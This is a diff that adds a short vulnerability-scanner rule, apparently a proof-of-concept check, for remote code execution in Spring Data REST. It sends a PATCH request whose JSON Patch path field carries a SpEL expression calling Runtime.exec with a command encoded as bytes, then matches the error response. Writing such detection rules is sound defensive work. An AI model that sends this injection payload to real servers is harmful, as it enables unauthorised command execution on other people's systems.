@@ -1,0 +1,13 @@
+name: Spring Data Rest RCE
+rules:
+  r0:
+    request:
+      method: PATCH
+      path: /customers/1
+      body: |
+        [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{108,115}))/lastname", "value": "ry" }]
+    expression: response.status == 400 && response.body.bcontains(b'cause') && response.body.bcontains(b'message')
+expression: r0()
+detail:
+    links:
+        - https://mp.weixin.qq.com/s/q2CNe9sscjlBXVaVUMCGNA
